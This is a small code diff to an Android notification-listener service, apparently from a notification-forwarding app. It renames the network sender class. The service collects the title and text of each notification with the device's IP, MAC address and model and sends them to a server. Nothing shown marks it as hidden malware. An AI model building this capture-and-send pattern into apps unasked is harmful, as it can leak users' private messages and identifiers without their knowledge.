@@ -6,7 +6,7 @@ import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 
 import com.leither.common.Tools;
-import com.leither.network.SendNotificationWebSocket;
+import com.leither.network.SendInfoToServer;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -34,11 +34,11 @@ public class NotificationCaptureService extends NotificationListenerService {
         JSONObject jsonObject = new JSONObject();
         try {
             jsonObject.put("ip", Tools.getWIFILocalIpAdress(getApplication()))
-            .put("mac" , Tools.getWifiMac(getApplication()))
+            .put("mac" , Tools.getWifiMac())
             .put("model", Tools.getDeviceName())
             .put("title", title)
             .put("text", text);
-            SendNotificationWebSocket.getDefault().send(jsonObject.toString());
+            SendInfoToServer.getDefault().send(jsonObject.toString());
         } catch (JSONException e) {
             e.printStackTrace();
         }
